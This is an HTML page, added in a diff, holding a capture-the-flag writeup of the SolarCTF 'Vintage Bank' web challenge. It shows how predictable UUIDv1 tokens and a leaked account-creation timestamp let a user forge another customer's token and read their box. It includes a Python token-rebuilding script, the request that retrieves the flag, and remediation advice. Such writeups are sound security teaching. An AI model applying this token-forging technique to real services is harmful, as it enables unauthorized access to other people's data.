@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Vintage Bank · SolarCTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="Safe deposit boxes are keyed by UUIDv1 tokens with a fixed MAC, fixed clock sequence and whole-second timestamps. A public ledger leaks the rental time, so the target box's UUID can be rebuilt directly." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=0e2bdd96" />
+<link rel="stylesheet" href="../css/pages.css?v=8dc67e7f" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <span>vintage-bank</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Vintage Bank <span class="page-sub">IDOR via predictable UUIDv1</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">SOLARCTF{idor_s4fe_d3posit_b0x}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Flag</strong></td>
+<td><code>SOLARCTF{idor_s4fe_d3posit_b0x}</code></td>
+</tr>
+<tr>
+<td><strong>Vuln</strong></td>
+<td>IDOR via predictable UUIDv1 + timestamp leak</td>
+</tr>
+</tbody></table>
+<h2 id="tldr"><a class="wu-anchor" href="#tldr" aria-hidden="true">#</a>TL;DR</h2>
+<p>Safe deposit boxes are accessed with a UUID token at <code>/api/cell/&lt;uuid&gt;</code>. The tokens are <strong>UUID version 1</strong> (time-based) with a fixed clock sequence, a fixed MAC address, and whole-second timestamps. A public ledger at <code>/api/ledger</code> leaks every customer&#39;s account opening time to the second. Rebuilding the UUID of the odd-one-out customer from their timestamp opens their box, and the API never checks ownership.</p>
+<h2 id="1-recon"><a class="wu-anchor" href="#1-recon" aria-hidden="true">#</a>1. Recon</h2>
+<p>The site is a little point-and-click bank. Ringing the bell at the teller window (<code>POST /api/rent</code>) issues a key card with a cell number and a UUID. Clicking the vault takes you to:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">https://vintage-bank.solarctf.ru/#/cell/&lt;uuid&gt;</code></pre>
+      
+    </figure><p>which calls <code>GET /api/cell/&lt;uuid&gt;</code> and returns:</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;cell&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;owner&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;...&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;...&quot;</span><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><p>A wrong token returns <code>{&quot;cell&quot;: null, &quot;owner&quot;: null, &quot;flag&quot;: null}</code>.</p>
+<blockquote>
+<p>Gotcha: the frontend still draws a vault for invalid tokens, computing the cell number client-side with <code>parseInt(uuid.slice(0,6), 16) % 30 + 1</code>. Random input like <code>ilovemygrandma</code> shows <code>№NaN</code>. This is cosmetic and not a vulnerability; always check the raw API response.</p>
+</blockquote>
+<h2 id="2-analyzing-the-uuids"><a class="wu-anchor" href="#2-analyzing-the-uuids" aria-hidden="true">#</a>2. Analyzing the UUIDs</h2>
+<p>Two keys issued a few minutes apart:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">be402a80-ca1b-11f1-9a2b-0242ac110002
+78379680-ca1c-11f1-9a2b-0242ac110002</code></pre>
+      
+    </figure><ul>
+<li>The third group starts with <code>1</code> → <strong>UUID version 1</strong> (time-based, not random).</li>
+<li><code>9a2b</code> (clock sequence) is identical in both.</li>
+<li><code>0242ac110002</code> (node) is identical in both. <code>02:42:ac:11:00:02</code> is a typical Docker container MAC.</li>
+<li>Only the timestamp (<code>time_low</code> + <code>time_mid</code> + <code>time_hi</code>) changes.</li>
+</ul>
+<p>Decoding the 60-bit timestamp (100 ns ticks since 1582-10-15):</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">t = (<span class="hljs-number">0x1f1</span> &lt;&lt; <span class="hljs-number">48</span>) | (<span class="hljs-number">0xca1b</span> &lt;&lt; <span class="hljs-number">32</span>) | <span class="hljs-number">0xbe402a80</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">unix = (t - <span class="hljs-number">0x01B21DD213814000</span>) / <span class="hljs-number">1e7</span>   <span class="hljs-comment"># -&gt; 2026-10-17 11:13:13.0 UTC</span></span></span></code></pre>
+      
+    </figure><p>The two keys differ by exactly <strong>3,120,000,000 ticks = 312.0 s</strong>, and the fractional part of each timestamp is <strong>0</strong>. The server only uses <strong>whole seconds</strong>, so a known creation time maps to exactly one UUID.</p>
+<h2 id="3-finding-the-timestamp-leak"><a class="wu-anchor" href="#3-finding-the-timestamp-leak" aria-hidden="true">#</a>3. Finding the Timestamp Leak</h2>
+<p>Reading the frontend JS reveals an endpoint used by the &quot;deposit book&quot; on the hall floor:</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">js</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-js"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">const</span> r = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;api/ledger&#x27;</span>);</span></span></code></pre>
+      
+    </figure><p><code>GET /api/ledger</code> returns all depositors with their <strong>opening date and time</strong>:</p>
+<figure class="wu-code" data-lines="6">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">[</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;ord&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Иванов М.&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;21.07.2026 12:32:35&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;cell&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">28</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  ...</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;ord&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">13</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Уточкин С.&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;23.04.2026 12:22:34&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;cell&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">  ...</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"><span class="hljs-punctuation">]</span></span></span></code></pre>
+      
+    </figure><p>The in-game text even hints at it: <em>&quot;Похоже, кто-то из сотрудников забыл важный документ…&quot;</em> (&quot;Looks like an employee forgot an important document…&quot;).</p>
+<h2 id="4-picking-the-target"><a class="wu-anchor" href="#4-picking-the-target" aria-hidden="true">#</a>4. Picking the Target</h2>
+<p>The names are almost all taken from a list of the most common Russian surnames (Smirnov, Ivanov, Kuznetsova, Sokolov, Popova...). One doesn&#39;t belong: <strong>Уточкин С.</strong> (&quot;little duckling&quot;), opened <code>23.04.2026 12:22:34</code>, cell 6.</p>
+<h2 id="5-exploitation"><a class="wu-anchor" href="#5-exploitation" aria-hidden="true">#</a>5. Exploitation</h2>
+<p>Rebuild the UUIDv1 from the timestamp, reusing the known clock sequence and node:</p>
+<figure class="wu-code" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> datetime <span class="hljs-keyword">as</span> d</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">date, tz = <span class="hljs-string">&quot;23.04.2026 12:22:34&quot;</span>, <span class="hljs-number">0</span>   <span class="hljs-comment"># ledger times turned out to be UTC</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">dt = d.datetime.strptime(date, <span class="hljs-string">&quot;%d.%m.%Y %H:%M:%S&quot;</span>) - d.timedelta(hours=tz)</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">t = <span class="hljs-built_in">int</span>(dt.replace(tzinfo=d.timezone.utc).timestamp()) * <span class="hljs-number">10</span>**<span class="hljs-number">7</span> + <span class="hljs-number">0x01B21DD213814000</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{t &amp; <span class="hljs-number">0xffffffff</span>:08x}</span>-<span class="hljs-subst">{(t &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span>:04x}</span>-&quot;</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">      <span class="hljs-string">f&quot;<span class="hljs-subst">{((t &gt;&gt; <span class="hljs-number">48</span>) &amp; <span class="hljs-number">0x0fff</span>) | <span class="hljs-number">0x1000</span>:04x}</span>-9a2b-0242ac110002&quot;</span>)</span></span></code></pre>
+      
+    </figure><table>
+<thead>
+<tr>
+<th>Timezone tried</th>
+<th>UUID</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>UTC+3 (Moscow)</td>
+<td><code>f5fb6900-3ef5-11f1-9a2b-0242ac110002</code></td>
+<td>all <code>null</code></td>
+</tr>
+<tr>
+<td><strong>UTC</strong></td>
+<td><code>1b48a100-3f0f-11f1-9a2b-0242ac110002</code></td>
+<td><strong>flag</strong></td>
+</tr>
+</tbody></table>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">GET /api/cell/1b48a100-3f0f-11f1-9a2b-0242ac110002</code></pre>
+      
+    </figure><figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;cell&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;owner&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Уточкин С.&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SOLARCTF{idor_s4fe_d3posit_b0x}&quot;</span><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-text">SOLARCTF{idor_s4fe_d3posit_b0x}</code></pre>
+      
+    </figure><h2 id="root-cause-fix"><a class="wu-anchor" href="#root-cause-fix" aria-hidden="true">#</a>Root Cause &amp; Fix</h2>
+<ol>
+<li><strong>Broken access control (IDOR):</strong> <code>/api/cell/&lt;uuid&gt;</code> returns a box to anyone holding the token, with no check that the box belongs to the current session. The server should authorize every request against the logged-in user.</li>
+<li><strong>Predictable identifiers:</strong> UUIDv1 leaks its creation time and host MAC. Secret tokens should come from a CSPRNG (e.g. UUIDv4 or <code>secrets.token_urlsafe()</code>). Unguessable IDs are defense in depth, not a replacement for authorization.</li>
+<li><strong>Information disclosure:</strong> <code>/api/ledger</code> exposes exact creation timestamps, which is the missing piece needed to forge tokens. Sensitive metadata shouldn&#39;t be served to unauthenticated users.</li>
+</ol>
+<h2 id="takeaways"><a class="wu-anchor" href="#takeaways" aria-hidden="true">#</a>Takeaways</h2>
+<ul>
+<li>&quot;We use UUIDs, so they can&#39;t be guessed&quot; is only true for <strong>v4</strong>. Always check the version nibble.</li>
+<li>Two samples of an identifier tell you a lot: what&#39;s fixed, what changes, and by how much.</li>
+<li>Read the frontend JS. Hidden API endpoints are often sitting right there.</li>
+</ul>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#tldr">TL;DR</a></li><li><a href="#1-recon">1. Recon</a></li><li><a href="#2-analyzing-the-uuids">2. Analyzing the UUIDs</a></li><li><a href="#3-finding-the-timestamp-leak">3. Finding the Timestamp Leak</a></li><li><a href="#4-picking-the-target">4. Picking the Target</a></li><li><a href="#5-exploitation">5. Exploitation</a></li><li><a href="#flag">Flag</a></li><li><a href="#root-cause-fix">Root Cause &amp; Fix</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="faded-trace.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Faded Trace</span></a>
+    <a class="wu-pager-link wu-pager-next" href="lockpick.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Lockpick</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=4dd8bec6"></script>
+</body>
+</html>
